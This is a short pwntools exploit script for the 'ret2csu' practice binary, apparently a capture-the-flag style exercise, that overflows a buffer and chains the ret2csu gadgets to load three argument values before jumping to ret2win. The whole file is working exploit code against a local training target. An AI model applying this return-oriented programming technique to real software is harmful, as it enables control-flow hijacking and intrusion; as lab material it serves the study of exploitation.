from pwn import * 
from struct import pack 
e = ELF('./ret2csu')

#r = gdb.debug('./ret2csu', 'break *pwnme+152\ncontinue')

r = process('./ret2csu')

param_1 = p64(0xdeadbeefdeadbeef)
param_2 = p64(0xcafebabecafebabe)
param_3 = p64(0xd00df00dd00df00d)

payload = b'a'*(0x20+8)

payload += p64(0x0040069a) + p64(0) + p64(1) + p64(0x00600e48) + p64(0) + param_2 + param_3 
payload += p64(0x00400680) + p64(0)*7
payload += p64(0x00000000004006a3) + param_1 
payload += p64(e.plt['ret2win'])

r.sendline(payload)
r.interactive()

